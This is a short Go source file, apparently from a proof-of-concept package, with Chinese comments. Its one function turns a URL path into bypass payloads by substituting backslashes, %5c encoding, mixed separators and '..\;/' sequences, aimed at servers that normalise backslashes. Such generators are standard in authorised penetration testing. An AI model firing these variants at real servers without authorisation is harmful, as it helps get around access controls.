package poc

import "strings"

// Backslash 生成反斜杠路径混淆 payload
// 利用某些服务器将 \ 当作 / 处理的特性
func Backslash(path string) []string {
	var results []string

	// 将所有 / 替换为 \
	results = append(results, strings.ReplaceAll(path, "/", "\\"))

	// 将所有 / 替换为 %5c (URL 编码的 \)
	results = append(results, strings.ReplaceAll(path, "/", "%5c"))

	// 混合: 交替使用 / 和 \
	parts := strings.Split(path, "/")
	if len(parts) > 2 {
		var sb strings.Builder
		for i, part := range parts {
			if part == "" && i == 0 {
				sb.WriteString("/")
				continue
			}
			if part == "" {
				continue
			}
			sb.WriteString(part)
			if i < len(parts)-1 {
				if i%2 == 0 {
					sb.WriteString("\\")
				} else {
					sb.WriteString("/")
				}
			}
		}
		results = append(results, sb.String())
	}

	// ..\;/ 变体
	results = append(results, path+"..\\;/")
	results = append(results, strings.ReplaceAll(path, "/", "/..\\;/"))

	return results
}
